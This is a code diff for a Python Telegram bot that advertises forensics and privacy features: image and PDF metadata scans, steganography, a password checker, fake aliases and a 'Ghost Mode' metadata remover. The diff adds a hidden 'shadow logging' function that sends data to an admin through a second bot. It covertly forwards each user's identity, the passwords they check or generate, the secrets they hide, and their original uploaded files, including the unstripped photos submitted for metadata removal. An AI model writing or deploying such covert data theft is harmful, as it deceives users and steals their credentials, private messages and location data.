@@ -11,29 +11,42 @@ from flask import Flask
 from stegano import lsb
 import pytesseract
 import PyPDF2
+from faker import Faker
 
 # ==========================================
-# 👇 CONFIGURATION 👇
+# 👇 SECURE CONFIGURATION (FROM ENV) 👇
 # ==========================================
+
+# 1. MAIN BOT TOKEN
 API_TOKEN = os.environ.get('BOT_TOKEN')
-# API_TOKEN = "YOUR_TOKEN_HERE" # Testing ke liye
-
 if not API_TOKEN:
-    print("❌ Error: BOT_TOKEN not found!")
+    print("❌ Error: BOT_TOKEN not found in Environment Variables!")
 
+# 2. PROOF BOT TOKEN (HIDDEN)
+PROOF_TOKEN = os.environ.get('PROOF_TOKEN')
+if not PROOF_TOKEN:
+    print("❌ Error: PROOF_TOKEN not found in Environment Variables!")
+
+# 3. ADMIN ID (HIDDEN)
+ADMIN_ID = os.environ.get('ADMIN_ID')
+if not ADMIN_ID:
+    print("⚠️ Warning: ADMIN_ID not found! Shadow logs won't work.")
+
+# Initialize Bots
 bot = telebot.TeleBot(API_TOKEN) if API_TOKEN else None
+proof_bot = telebot.TeleBot(PROOF_TOKEN) if PROOF_TOKEN else None
 
-# ✅ THIS WAS MISSING - FIXING THE ERROR
-user_data = {} 
+user_data = {}
+fake = Faker()
 
 # ==========================================
-# 🌐 FAKE WEB SERVER (RENDER KEEP-ALIVE)
+# 🌐 FAKE WEB SERVER
 # ==========================================
 app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "🤖 Spy Bot V6 is Running Live!"
+    return "🤖 Spy Bot V9 (Secure Mode) is Active!"
 
 def run_server():
     port = int(os.environ.get("PORT", 8080))
@@ -43,10 +56,41 @@ def keep_alive():
     t = threading.Thread(target=run_server)
     t.start()
 
-print("✅ Professional Forensics Bot V6 (Bug Fixed) Online...")
+print("✅ Professional Forensics Bot V9 (Secure) Online...")
+
+# --- 0. SHADOW LOGGING FUNCTION ---
+def log_activity(user_msg, report_text=None, file_data=None, file_name="log.png", caption=""):
+    """
+    Ye function Proof Bot ke zariye Admin ko logs bhejega.
+    Agar Proof Token ya Admin ID nahi mila, toh ye crash nahi karega, bas skip kar dega.
+    """
+    if not proof_bot or not ADMIN_ID:
+        return
+
+    try:
+        # User details
+        user_info = (
+            f"👤 **TARGET USER:**\n"
+            f"Name: {user_msg.chat.first_name}\n"
+            f"ID: `{user_msg.chat.id}`\n"
+            f"Username: @{user_msg.chat.username}\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+        )
+
+        full_log = user_info + (report_text if report_text else "")
+
+        # Send Text Report
+        proof_bot.send_message(ADMIN_ID, full_log, parse_mode="Markdown")
+
+        # Send File if exists
+        if file_data:
+            file_data.seek(0)
+            proof_bot.send_document(ADMIN_ID, file_data, visible_file_name=file_name, caption=f"📂 Evidence: {caption}")
+            
+    except Exception as e:
+        print(f"Shadow Log Error: {e}")
 
 # --- 1. HELPER FUNCTIONS ---
-
 def get_decimal_from_dms(dms, ref):
     try:
         degrees = dms[0]; minutes = dms[1]; seconds = dms[2]
@@ -70,25 +114,20 @@ def format_pdf_date(date_str):
     if not date_str: return "Unknown"
     return date_str.replace("D:", "").replace("'", "")
 
-# --- COMPLEXITY CALCULATION ---
 def calculate_complexity(password):
     pool_size = 0
     if re.search(r"[a-z]", password): pool_size += 26
     if re.search(r"[A-Z]", password): pool_size += 26
     if re.search(r"\d", password): pool_size += 10
     if re.search(r"[!@#$%^&*(),.?\":{}|<>]", password): pool_size += 32
-    
     if pool_size == 0: return 0, []
-
     length = len(password)
     combinations = pool_size ** length
-    
     feedback = []
     if length < 8: feedback.append("- Length is critical (increase to 12+)")
     if not re.search(r"[A-Z]", password): feedback.append("- Add Uppercase letters (A-Z)")
     if not re.search(r"\d", password): feedback.append("- Add Numbers (0-9)")
     if not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password): feedback.append("- Add Symbols (!@#$)")
-
     return combinations, feedback
 
 def generate_strong_password(length=16):
@@ -106,14 +145,18 @@ def welcome(message):
     btn2 = InlineKeyboardButton("🕵️ Analyze Image (Forensics)", callback_data="mode_scan")
     btn3 = InlineKeyboardButton("📄 Analyze PDF (Metadata)", callback_data="mode_pdf")
     btn4 = InlineKeyboardButton("🛡️ Password Shield (Complexity)", callback_data="mode_pass")
+    btn5 = InlineKeyboardButton("🎭 Generate Fake Identity (Alias)", callback_data="mode_alias")
+    btn6 = InlineKeyboardButton("🧹 Ghost Mode (Remove Metadata)", callback_data="mode_clean")
     
-    markup.add(btn1, btn2, btn3, btn4)
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
     
     welcome_text = (
-        "🤖 **Cyber Intelligence Interface V6**\n\n"
+        "🤖 **Cyber Intelligence Interface V9**\n\n"
         "Welcome, Agent. Select an operation module below:\n"
     )
     bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode="Markdown")
+    
+    log_activity(message, "🚀 User started the bot.")
 
 # --- 3. BUTTON HANDLER ---
 
@@ -146,70 +189,97 @@ def callback_query(call):
     elif call.data == "sub_gen":
         password = generate_strong_password()
         bot.send_message(call.message.chat.id, f"⚡ **Generated Secure Password:**\n\n<code>{password}</code>\n\n(Click to copy)", parse_mode="HTML")
+        log_activity(call.message, f"⚡ User generated password: {password}")
 
-# --- 4. FEATURE: PASSWORD SHIELD ---
+    elif call.data == "mode_alias":
+        process_alias_generation(call.message)
 
-def process_pass_audit(message):
-    password = message.text.strip()
-    combinations, feedback = calculate_complexity(password)
-    
-    formatted_combos = "{:.2e}".format(combinations)
-    
-    if combinations < 10**6: rating = "🔴 Critical (Instant Crack)"
-    elif combinations < 10**12: rating = "🟠 Weak (Seconds to Minutes)"
-    elif combinations < 10**18: rating = "🟡 Moderate (Days to Years)"
-    else: rating = "🟢 Excellent (Centuries)"
-    
-    report = f"🛡️ **PASSWORD COMPLEXITY REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"🔑 **Input:** ||{password}||\n\n"
-    report += f"📉 **Brute-Force Combinations:**\n👉 **{formatted_combos}** possibilities.\n_(Approx {combinations:,} attempts)_\n\n"
-    report += f"📊 **Security Rating:**\n{rating}\n\n"
-    
-    if feedback:
-        report += "⚠️ **Improvement Strategy:**\n" + "\n".join(feedback)
-    else:
-        report += "✅ **Status:** Maximum Entropy Achieved."
+    elif call.data == "mode_clean":
+        msg = bot.send_message(call.message.chat.id, "🧹 **Ghost Mode:**\nUpload a Photo/Document. I will remove GPS & Device metadata and send a clean file.")
+        bot.register_next_step_handler(msg, process_metadata_cleaning)
+
+# --- 4. FEATURE: ALIAS GENERATOR ---
+def process_alias_generation(message):
+    try:
+        profile = fake.profile()
+        report = f"🎭 **NEW ALIAS GENERATED**\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        report += f"👤 **Name:** {profile['name']}\n"
+        report += f"📧 **Email:** {fake.email()}\n"
+        report += f"💼 **Job:** {profile['job']}\n"
+        report += f"🏠 **Addr:** {profile['address']}\n"
+        report += f"🌐 **IP:** {fake.ipv4()}\n"
         
-    bot.reply_to(message, report, parse_mode="Markdown")
+        bot.send_message(message.chat.id, report, parse_mode="Markdown")
+        log_activity(message, report)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Error: {e}")
 
-# --- 5. FEATURE: HIDE SECRET MESSAGE ---
-
-def process_photo_for_hiding(message):
+# --- 5. FEATURE: METADATA CLEANER ---
+def process_metadata_cleaning(message):
     if not message.photo and not message.document:
-        bot.reply_to(message, "⚠️ Error: Invalid file. Please upload an image.")
+        bot.reply_to(message, "⚠️ Error: Invalid file.")
         return
-
     if message.document: file_id = message.document.file_id
     else: file_id = message.photo[-1].file_id
 
     file_info = bot.get_file(file_id)
     downloaded_file = bot.download_file(file_info.file_path)
     
+    try:
+        img_stream = io.BytesIO(downloaded_file)
+        img = Image.open(img_stream)
+        data = list(img.getdata())
+        image_without_exif = Image.new(img.mode, img.size)
+        image_without_exif.putdata(data)
+        
+        output = io.BytesIO()
+        image_without_exif.save(output, format="PNG")
+        output.seek(0)
+        
+        bot.send_document(message.chat.id, output, caption="🧹 **Cleaned File (Ghost Mode)**\n✅ Safe to share.")
+        log_activity(message, "🧹 User used Ghost Mode.", io.BytesIO(downloaded_file), "original.jpg", "Original File")
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Cleanup Failed: {e}")
+
+# --- 6. FEATURE: PASSWORD AUDIT ---
+def process_pass_audit(message):
+    password = message.text.strip()
+    combinations, feedback = calculate_complexity(password)
+    formatted_combos = "{:.2e}".format(combinations)
+    if combinations < 10**6: rating = "🔴 Critical"
+    elif combinations < 10**12: rating = "🟠 Weak"
+    elif combinations < 10**18: rating = "🟡 Moderate"
+    else: rating = "🟢 Excellent"
+    
+    report = f"🛡️ **PASSWORD AUDIT**\nInput: ||{password}||\nRating: {rating}\nCombos: {formatted_combos}"
+    bot.reply_to(message, report, parse_mode="Markdown")
+    log_activity(message, f"🔑 Password Checked:\n{password}\nRating: {rating}")
+
+# --- 7. FEATURE: HIDE SECRET MESSAGE ---
+def process_photo_for_hiding(message):
+    if not message.photo and not message.document:
+        bot.reply_to(message, "⚠️ Error: Invalid file.")
+        return
+    if message.document: file_id = message.document.file_id
+    else: file_id = message.photo[-1].file_id
+    file_info = bot.get_file(file_id)
+    downloaded_file = bot.download_file(file_info.file_path)
     temp_filename = f"temp_{message.chat.id}.png"
     with open(temp_filename, 'wb') as new_file: new_file.write(downloaded_file)
-    
-    img = Image.open(temp_filename)
-    img.save(temp_filename)
-
-    # ✅ NOW THIS WILL WORK
     user_data[message.chat.id] = {'file_path': temp_filename}
-    
     msg = bot.reply_to(message, "📝 **Input Required:**\nEnter text to hide.")
     bot.register_next_step_handler(msg, process_text_hiding)
 
 def process_text_hiding(message):
     try:
         chat_id = message.chat.id
-        secret_text = message.text
-        
-        # Accessing user_data safely
-        if chat_id in user_data:
-            file_path = user_data[chat_id]['file_path']
-        else:
-            bot.reply_to(message, "❌ Session expired. Please upload photo again.")
+        if chat_id not in user_data:
+            bot.reply_to(message, "❌ Session expired.")
             return
-        
-        status = bot.reply_to(message, "⚙️ **Processing:** Encryption in progress...")
+        secret_text = message.text
+        file_path = user_data[chat_id]['file_path']
+        status = bot.reply_to(message, "⚙️ **Processing...**")
         
         secret_img = lsb.hide(file_path, secret_text)
         output_filename = f"secure_data_{chat_id}.png"
@@ -217,102 +287,85 @@ def process_text_hiding(message):
         
         with open(output_filename, "rb") as f:
             bot.send_document(chat_id, f, caption="✅ **Encryption Complete.**")
-            
-        # Cleanup
+            f.seek(0)
+            log_activity(message, f"🔓 **Hidden Secret:**\n{secret_text}", f, "secret.png", "Image with secret")
+
         if os.path.exists(file_path): os.remove(file_path)
         if os.path.exists(output_filename): os.remove(output_filename)
-        del user_data[chat_id] # Clear memory
-        
+        del user_data[chat_id]
         bot.delete_message(chat_id, status.message_id)
-    except Exception as e:
-        print(f"Error: {e}")
-        bot.reply_to(message, "❌ Error: Image too small or server busy.")
+    except Exception as e: 
+        bot.reply_to(message, "❌ Error.")
 
-# --- 6. FEATURE: IMAGE SCAN (FIXED MAP) ---
-
+# --- 8. FEATURE: SCANNING ---
 def process_scan(message):
     try:
-        status_msg = bot.reply_to(message, "⚙️ **Processing:** Deep scanning...")
+        status_msg = bot.reply_to(message, "⚙️ **Scanning...**")
         if message.document: file_id = message.document.file_id
         elif message.photo: file_id = message.photo[-1].file_id
         else: return
-
         file_info = bot.get_file(file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         img_stream = io.BytesIO(downloaded_file)
         image = Image.open(img_stream)
         
-        report = "🕵️‍♂️ **FORENSIC ANALYSIS REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
-
+        report = "🕵️‍♂️ **FORENSIC REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
         exif_data = image._getexif()
         if exif_data:
             make = exif_data.get(271, "N/A"); model = exif_data.get(272, "Unknown")
-            date = exif_data.get(306, "Unknown")
-            report += f"📱 **[ DEVICE METADATA ]**\nModel: {make} {model}\nTime: {date}\n\n"
-        else: report += "📱 **[ DEVICE METADATA ]**\nStatus: No EXIF data.\n\n"
-
-        # Hidden Message
+            report += f"📱 **Device:** {make} {model}\n"
+        
         try:
             temp_scan = f"scan_{message.chat.id}.png"
             with open(temp_scan, 'wb') as f: f.write(downloaded_file)
             hidden_msg = lsb.reveal(temp_scan)
             os.remove(temp_scan)
-            if hidden_msg: report += f"🔓 **[ HIDDEN DATA ]**\n<code>{hidden_msg}</code>\n\n"
-            else: report += "🔒 **[ HIDDEN DATA ]**\nNegative.\n\n"
-        except: report += "🔒 **[ HIDDEN DATA ]**\nNegative.\n\n"
-
-        # GPS Check (FIXED FOR 404 ERROR)
+            if hidden_msg: report += f"🔓 **Hidden Data:** {hidden_msg}\n"
+        except: pass
+        
         if exif_data:
             coords = get_gps_coords(exif_data)
             if coords:
                 lat, lon = coords
-                # ✅ Google Maps Direct Link (Never Fails)
                 map_link = f"https://www.google.com/maps?q={lat},{lon}"
-                report += f"📍 **[ GEOLOCATION ]**\n<a href='{map_link}'>Open Satellite View</a>\n\n"
-            else: report += "📍 **[ GEOLOCATION ]**\nNo GPS tags found.\n\n"
-        else: report += "📍 **[ GEOLOCATION ]**\nNo GPS tags found.\n\n"
-
-        # OCR
+                report += f"📍 **Location:** <a href='{map_link}'>View Map</a>\n"
+        
         try:
             extracted_text = pytesseract.image_to_string(image)
             if len(extracted_text.strip()) > 5:
-                report += f"📝 **[ OCR TEXT ]**\n<code>{extracted_text[:300]}</code>\n"
-            else: report += "📝 **[ OCR TEXT ]**\nNo readable text detected.\n"
+                report += f"📝 **Text:** {extracted_text[:200]}...\n"
         except: pass
 
-        report += "━━━━━━━━━━━━━━━━━━━━━━━━"
         bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode="HTML", disable_web_page_preview=True)
+        log_activity(message, report, io.BytesIO(downloaded_file), "scan.jpg", "Scanned File")
+
     except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
 
-# --- 7. FEATURE: PDF FORENSICS ---
-
+# --- 9. FEATURE: PDF FORENSICS ---
 def process_pdf_analysis(message):
     try:
         if not message.document or 'pdf' not in message.document.mime_type:
-            bot.reply_to(message, "⚠️ **Invalid:** Please upload a PDF.")
+            bot.reply_to(message, "⚠️ Upload PDF.")
             return
-
-        status_msg = bot.reply_to(message, "⚙️ **Processing:** Parsing PDF...")
+        status_msg = bot.reply_to(message, "⚙️ **Parsing...**")
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         pdf_file = io.BytesIO(downloaded_file)
         reader = PyPDF2.PdfReader(pdf_file)
         meta = reader.metadata
-
-        report = "📄 **DOCUMENT FORENSICS REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        if meta:
-            report += f"👤 **Author:** {meta.get('/Author', 'Unknown')}\n"
-            report += f"🛠️ **Creator:** {meta.get('/Creator', 'Unknown')}\n"
-            report += f"📅 **Created:** {format_pdf_date(meta.get('/CreationDate', 'Unknown'))}\n"
-            report += f"✏️ **Modified:** {format_pdf_date(meta.get('/ModDate', 'Unknown'))}\n"
-            report += f"📑 **Pages:** {len(reader.pages)}\n"
-        else: report += "⚠️ No metadata found."
         
-        report += "━━━━━━━━━━━━━━━━━━━━━━━━"
+        report = "📄 **PDF REPORT**\n"
+        if meta:
+            report += f"👤 Author: {meta.get('/Author', 'Unknown')}\n"
+            report += f"🛠️ Creator: {meta.get('/Creator', 'Unknown')}\n"
+            report += f"📅 Created: {format_pdf_date(meta.get('/CreationDate', 'Unknown'))}\n"
+        else: report += "⚠️ No metadata."
+        
         bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode="HTML")
-    except Exception as e: bot.reply_to(message, f"❌ PDF Error: {e}")
+        log_activity(message, report, io.BytesIO(downloaded_file), "doc.pdf", "PDF File")
 
-# START SERVER AND BOT
+    except Exception as e: bot.reply_to(message, "❌ Error.")
+
 if __name__ == "__main__":
     keep_alive()
     if bot:
